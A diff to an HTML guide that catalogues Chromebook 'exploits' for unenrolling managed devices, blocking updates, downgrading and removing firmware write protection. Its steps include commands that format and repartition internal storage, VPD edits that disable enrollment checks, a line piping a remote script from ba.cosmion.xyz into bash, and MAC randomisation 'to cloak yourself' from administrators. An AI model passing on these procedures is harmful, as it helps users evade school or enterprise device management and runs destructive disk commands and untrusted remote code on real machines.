@@ -174,6 +174,8 @@
             <br>
             <a id="ND" href="#BadRecovery">BadRecovery</a>
             <br>
+            <a id="ND" href="#BadSH1MMER">BadSH1MMER</a>
+            <br>
             <a id="ND" href="#Baghdad">Baghdad</a>
             <br>
             <a id="ND" href="#Blank3r">Blank3r</a>
@@ -207,12 +209,7 @@
             <br>
             <a id="ND" href="#ChrioskDumping">Chriosk Dumping</a>
             <br>
-            <details>
-                <summary><a id="ND" href="#CKAUB">CKAUB</a><br></summary>
-                    <ul>
-                        <li><a id="ND" href="#DAUB">DAUB</a></li>
-                    </ul>
-            </details>
+            <a id="ND" href="#CKAUB">CKAUB</a>
             <br>
             <a id="ND" href="#CookieDough">Cookie Dough</a>
             <br>
@@ -223,6 +220,8 @@
             <a id="ND" href="#CroshFi">CroshFi</a>
             <br>
             <a id="ND" href="#Cryptosmite">Cryptosmite</a>
+            <br>
+            <a id="ND" href="#DAUB">DAUB</a>
             <br>
             <a id="ND" href="#De-roll">De-roll</a>
             <br>
@@ -737,11 +736,11 @@
         <p style="display: none"><a href="#ToC">back to top</a></p>
         <br>
         <details>
-            <searchi>v132</searchi>
+            <searchi>128</searchi>
             <searchi>Web</searchi>
             <searchi>har har har</searchi>
             <summary><b id="Hartools">Hartools</b></summary>
-            <p class="small-text">Patched on Chrome OS 133+
+            <p class="small-text">Patched on Chrome OS 129+
             <br>
             har har har har har har
             <br>
@@ -1426,15 +1425,42 @@
             <br>
             1: Check your kernver by entering Recovery Mode (Esc+Refresh+Power) & pressing Tab.
             <br>
-            2: Look at the text in the top-left corner. If the number ends in 4+, your Chromebook is unsupported.
+            2: Look at the text in the top-left corner. If the kernver text ends in 4+, your Chromebook is unsupported.
             <br>
-            3: Download a bin from chrome100.dev.
+            3: Download a bin from cros.download.
             <br>
             4: Go <a href="https://binbashbanana.github.io/badrecovery/builder.html">here</a> & upload it, then flash it.
             <br>
             5: Enter Recovery Mode (Esc+Refresh+Power).
             <br>
-            6: Insert the extenral storage device & follow its instructions.
+            6: Insert the external storage device & follow its instructions.
+        </details>
+        <p style="display: none"><a href="#ToC">back to top</a></p>
+        <br>
+        <details>
+            <searchi>135-7</searchi>
+            <searchi>OS</searchi>
+            <searchi>ExternalStorageDevice</searchi>
+            <summary><b id="BadSH1MMER">BadSH1MMER</b></summary>
+            <p class="small-text">Requires a storage device, another PC; only works on Chrome OS v135-7 (due to sh1ttyOOBE)
+            <br>
+            Works on keyrolled devices.
+            <br>
+            Created by <a href="https://github.com/crossjbly">crossjbly</a>.
+            <br>
+            Chrome OS-based exploit.</p>
+            <details>
+                <summary>BadSH1MMER.mp4</summary>
+                <video width="640" height="480" controls> <source src="video.mp4" type="video/mp4">Looks like your browser is a shit of piece.</video>
+            </details>
+            <br>
+            1: Complete <a href="#sh1ttyOOBE">sh1ttyOOBE</a>.
+            <br>
+            2: Make a <a href="https://github.com/crosbreaker/badsh1mmer">BadSH1MMER</a> image, then flash it.
+            <br>
+            3: Enter Recovery Mode (Esc+Refresh+Power).
+            <br>
+            4: Boot the external storage device & run any payloads you want, such as the BadBr0ker payload.
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
         <br>
@@ -1526,9 +1552,11 @@
             <searchi>OS</searchi>
             <searchi>ExternalStorageDevice</searchi>
             <summary><b id="Br0ker">Br0ker</b></summary>
-            <p class="small-text">Requires extenral storage device; patched on Chrome OS v133+
+            <p class="small-text">Requires external storage device; patched on Chrome OS v133+
             <br>
-            Unenrollment exploit. Note if you're on kernver 5 you'll have to use a v132 LTS-channel image, ie. for platform version 16093.109.0.
+            Unenrollment exploit.
+            <br>
+            If you're keyrolled, you can use the BadBr0ker payload in <a id="ND" href="#BadSH1MMER">BadSH1MMER</a>.
             <br>
             Chrome OS-based exploit.</p>
             <br>
@@ -1539,20 +1567,19 @@
             <br>
             1: Downgrade to v132 (or lower). You can skip this step if you build a SH1MMER shim yourself, as it includes a downgrading payload.
             <br>
-            2: Flash a SH1MMER image with <a href="https://github.com/ading2210/sh1mmer/actions/runs/16721214945">an updated payload</a> & run it.
+            2: Flash a SH1MMER image with <a href="https://github.com/ading2210/sh1mmer/actions/runs/16721214945">an updated payload</a> & run it. If you're keyrolled, you can use <a href="#BadSH1MMER">BadSH1MMER</a> instead.
             <br>
-            3: Run the Br0ker payload, then press Y to continue.
+            3: Run the (Bad)Br0ker payload, then press Y to continue.
             <br>
             4: Once it restarts. wait until the "Get Started" button appears, then enter Dev Mode again.
             <br>
-            <br>
+            5: Follow the instructions below based on your current version. You do not have to follow these if you're using BadBr0ker.
             <details>
                 <summary><b>v110 & lower</b></summary>
                 A: Run this command in any root shell, then powerwash:
                 <br>
                 <i>vpd -i RW_VPD -s check_enrollment=0</i>
             </details>
-            <br>
             <details>
                 <summary><b>v111-124</b></summary>
                 A: Run these commands in either VT2 shell or Ctrl+U booted shim, then powerwash:
@@ -1563,7 +1590,6 @@
                 <br>
                 <i>cryptohome --action=remove_firmware_management_parameters</i>
             </details>
-            <br>
             <details>
                 <summary><b>v125-135</b></summary>
                 A: Powerwash, open VT2 shell, run these commands exactly (> included), then exit & set up the device (without rebooting until finished):
@@ -1578,7 +1604,6 @@
                 <br>
                 <i>initctl restart ui</i>
             </details>
-            <br>
             <details>
                 <summary><b>v136+</b></summary>
                 A: Powerwash, open VT2 shell, run these commands exactly (> included), then exit & set up the device (without rebooting until finished):
@@ -1589,8 +1614,7 @@
                 <br>
                 <i>initctl restart ui</i>
             </details>
-            <br>
-            5: Enable "MAC Address Randomization" in chrome://flags to cloak yourself.
+            6: Enable "MAC Address Randomization" in chrome://flags to cloak yourself.
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
         <br>
@@ -1738,7 +1762,7 @@
             <summary><b id="CKAUB">CKAUB</b></summary>
             <p class="small-text">d
             <br>
-            Prevents your Chromebook from automatically updating by deleting the update partitions. Version of DAUB that allows for updating Chrome OS manually.
+            Prevents your Chromebook from automatically updating by deleting the update partitions. Version of <a id="ND" href="#DAUB">DAUB</a> that allows for updating Chrome OS manually.
             <br>
             Works while enrolled.
             <br>
@@ -1757,47 +1781,7 @@
             <br>
             1: Run the payload, then run "<i>dd if=/dev/sdX4 of=/dev/mmcblk0p2 bs=1M oflag=direct status=progress</i>" & "<i>dd if=/dev/sdX3 of=/dev/mmcblk0p3 bs=1M oflag=direct status=progress</i>", where <i>X</i> is your external storage device's drive letter. You can run "<i>lsblk</i>" in the dialog where it asks you to enter the command.
             <br>
-            2: When it asks you to flash a recovery image, flash one that's +1 kernver higher than your current. 
-            <br>
-            <br>
-            <details>
-                <searchi>Any</searchi>
-                <searchi>OS</searchi>
-                <summary><b id="DAUB">DAUB</b></summary>
-                <p class="small-text">Might not work
-                <br>
-                Prevents your Chromebook from automatically updating by deleting the update partitions. Also blocks kernver updates.
-                <br>
-                OS-based exploit.</p>
-                <details>
-                    <summary>DAUB.mp4</summary>
-                    <video width="640" height="480" controls> <source src="video.mp4" type="video/mp4">Looks like your browser is a shit of piece.</video>
-                </details>
-                <br>
-                1: Access a shell (via methods such as SH1MMER or BadApple).
-                <br>
-                2: Run the following (3rd will open a prompt):
-                <br>
-                <i>cgpt add /dev/mmcblk0 -i 2 -P 10 -T 5 -S 1</i>
-                <br>
-                <i>yes | mkfs.ext4 /dev/mmcblk0p1</i>
-                <br>
-                <i>fdisk /dev/mmcblk0</i>
-                <br>
-                <i>d</i>
-                <br>
-                <i>4</i>
-                <br>
-                {<i>just press enter</i>}
-                <br>
-                <i>d</i>
-                <br>
-                <i>5</i>
-                <br>
-                {<i>just press enter</i>}
-                <br>
-                <i>w</i>
-            </details>
+            2: When it asks you to flash a recovery image, flash one that's +1 kernver higher than your current.
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
         <br>
@@ -1818,9 +1802,9 @@
             <br>
             1: Check your kernver by entering Recovery Mode (Esc+Refresh+Power) & pressing Tab.
             <br>
-            2: Look at the text in the top-left corner. If the number ends in 3+, your Chromebook is unsupported.
+            2: Look at the text in the top-left corner. If the kernver text in 3+, your Chromebook is unsupported.
             <br>
-            3: Download a SH1MMER injected RMA Shim from <a href="">here</a> or build your own (wether via Wax4Web or a command line).
+            3: Download a SH1MMER injected RMA shim from <a href="">here</a> or build your own (wether via Wax4Web or a command line).
             <br>
             4: Flash the injected RMA Shim onto a USB device.
             <br>
@@ -1839,9 +1823,51 @@
         <details>
             <searchi>Any</searchi>
             <searchi>OS</searchi>
-            <searchi>ExtensionAccess;ExternalStorageDevice;RecoveryMode</searchi>
+            <summary><b id="DAUB">DAUB</b></summary>
+            <p class="small-text">Might not work
+            <br>
+            Prevents your Chromebook from automatically updating by deleting the update partitions. Also blocks kernver updates.
+            <br>
+            Just use <a id="ND" href="#CKAUB">CKAUB</a> instead.
+            <br>
+            OS-based exploit.</p>
+            <details>
+                <summary>DAUB.mp4</summary>
+                <video width="640" height="480" controls> <source src="video.mp4" type="video/mp4">Looks like your browser is a shit of piece.</video>
+            </details>
+            <br>
+            1: Access a shell (via methods such as SH1MMER or BadApple).
+            <br>
+            2: Run the following (3rd will open a prompt):
+            <br>
+            <i>cgpt add /dev/mmcblk0 -i 2 -P 10 -T 5 -S 1</i>
+            <br>
+            <i>yes | mkfs.ext4 /dev/mmcblk0p1</i>
+            <br>
+            <i>fdisk /dev/mmcblk0</i>
+            <br>
+            <i>d</i>
+            <br>
+            <i>4</i>
+            <br>
+            {<i>just press enter</i>}
+            <br>
+            <i>d</i>
+            <br>
+            <i>5</i>
+            <br>
+            {<i>just press enter</i>}
+            <br>
+            <i>w</i>
+        </details>
+        <p style="display: none"><a href="#ToC">back to top</a></p>
+        <br>
+        <details>
+            <searchi>Any</searchi>
+            <searchi>OS</searchi>
+            <searchi>ExternalStorageDevice;RecoveryMode</searchi>
             <summary><b id="Downgration">Downgration</b></summary>
-            <p class="small-text">Requires a storage device; extension access required; Mostly Limited
+            <p class="small-text">Requires a storage device; mostly limited
             <br>
             Downgrade your Chromebook.
             <br>
@@ -1853,27 +1879,31 @@
             <br>
             1: Check your kernver by entering Recovery Mode (Esc+Refresh+Power) & pressing Tab.
             <br>
-            2: Look at the text in the top-left corner. If the number ends in 0 or 1, your Chromebook can downgrade to any version. Otherwise, it's limited.
-                <p class="small-text indented">Minimum versions:</p>
-                    <p class="small-text indented2">0/1: N/A</p>
-                    <p class="small-text indented2">2: 112</p>
-                    <p class="small-text indented2">3: 120</p>
-                    <p class="small-text indented2">4: 125</p>
-                    <p class="small-text indented2">5: 132</p>
-                    fwver 2 versions are 114+
-            3: Go to chrome://version & check your board (under platform).
+            2: Look at the text in the top-left corner & check what the kernver text ends in.
+                <p class="small-text indented">Minimum versions:</a>
+                    <br>
+                    <a class="small-text indented">0/1: N/A</a>
+                    <br>
+                    <a class="small-text indented">2: 112</a>
+                    <br>
+                    <a class="small-text indented">3: 120</a>
+                    <br>
+                    <a class="small-text indented">4: 125</a>
+                    <br>
+                    <a class="small-text indented">5: 132
+                    <br>
+                firmware 2 versions are 114+</a></p>
+            3: Go to chrome://version & check your board (after platform).
             <br>
-            4: Go to chrome100.dev & find your board (use Ctrl+F) or find the bins <a href="">here</a>.
+            4: Go to cros.download & find your board.
             <br>
-            5: Download the version of Chrome OS you want.
+            5: Download the version of Chrome OS you want. Note the images come with kernver updates, & some versions have multiple variations with different kernver updates bundled in.
             <br>
-            6: Install the Chromebook Recovery Utility extension & run it.
+            6: Flash the image.
             <br>
-            7: Plug in the storage device & follow the instructions.
+            7: On your Chromebook, enter Recovery Mode (Esc+Power+Refresh) & plug in your external storage device.
             <br>
-            8: On your Chromebook, enter Recovery Mode (Esc+Reload+Power) & follow the prompts.
-            <br>
-            9: Skip the "Checking for Updates" screen by pressing Ctrl+Shift+E.
+            8: Skip the "Checking for Updates" screen by waiting, or on older version pressing Ctrl+Shift+E.
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
         <br>
@@ -1973,7 +2003,7 @@
             </details>
             <br>
             <details>
-                <searchi>v113</searchi>
+                <searchi>113</searchi>
                 <searchi>Hardware</searchi>
                 <searchi>Screwdriver</searchi>
                 <summary><b id="FWWP:Jumper">Jumper</b></summary>
@@ -1998,10 +2028,10 @@
                 2: Unplug the power cord connecting the battery & motherboard.
                 <br>
                 3: Run the nessesary commands. If you're on v136+ change the device secret.
-                <i class="small-text indented">Save device secret: <i>vpd -i RO_VPD -l</i>
+                <i class="small-text indented">Save device secret: vpd -i RO_VPD -l
                 <br>
-                Change device secret: <i>vpd -i RO_VPD -s stable_device_secret_DO_NOT_SHARE=device_secret</i>
-                </p>
+                Change device secret: vpd -i RO_VPD -s stable_device_secret_DO_NOT_SHARE=device_secret</i>
+                <br>
                 4: Plug the power cord back in & screw the back cover on (or just leave it off you fucking psycho).
             </details>
             <br>
@@ -2109,8 +2139,8 @@
                 A: Enable Dev Mode (Esc+Power+Refresh, then Ctrl+D, even if blocked) & then reenter Recovery Mode.
                 <br>
                 B: Select "Internet Recovery" & reconnect to the same Wi-Fi network if needed.
-                    <br>
-                    C: When connected, press Ctrl+Alt+F3 & run "<i>bash <(curl -SLk http://ba.cosmion.xyz/script)</".
+                <br>
+                C: When connected, press Ctrl+Alt+F3 & run "<i>bash <(curl -SLk http://ba.cosmion.xyz/script)</i>".
             </details>
             <br>
             3: Reboot into Verified Mode & <b>do not click continue</b>. Open up the Network Configuration instead (bottom right corner).
@@ -2118,6 +2148,7 @@
             4: Set the connection type to "Manual" & the "Secure HTTP" options to those given earlier, then click "Save" & continue the setup process.
             <br>
             5: Enable "MAC Address Randomization" in chrome://flags to cloak yourself.
+            </details>
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
         <br>
@@ -2317,7 +2348,7 @@
             <br>
             1: Check your kernver by entering Recovery Mode (Esc+Refresh+Power) & pressing Tab.
             <br>
-            2: Look at the text in the top-left corner. If the number ends in 2 or more, your Chromebook is unsupported.
+            2: Look at the text in the top-left corner. If the kernver text ends in 2 or more, your Chromebook is unsupported.
             <br>
             3: Find your Chromebook’s board name by going to chrome://version. It will be behind “stable-channel”.
             <br>
@@ -2396,6 +2427,8 @@
             Afterwards, simply restart or press Alt+Volume Up+X to return to the lockscreen. This will persist until the next powerwash.
             <br>
             B: After gaining persistance via the above instruction, you can simply boot modified recovery images in unverified Recovery Mode.</p>
+            <br>
+            Afterwards, you can also preform BadBr0ker & <a id="ND" href="#BadSH1MMER">BadSH1MMER</a>.
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
         <br>
@@ -2757,7 +2790,7 @@
             <br>
             1: Check your kernver by entering Recovery Mode (Esc+Refresh+Power) & pressing Tab.
             <br>
-            2: Look at the text in the top-left corner. If the number ends in 4+, your Chromebook is unsupported.
+            2: Look at the text in the top-left corner. If the kernver text ends in 4+, your Chromebook is unsupported.
             <br>
             4: Enter Dev Mode.
             <br>
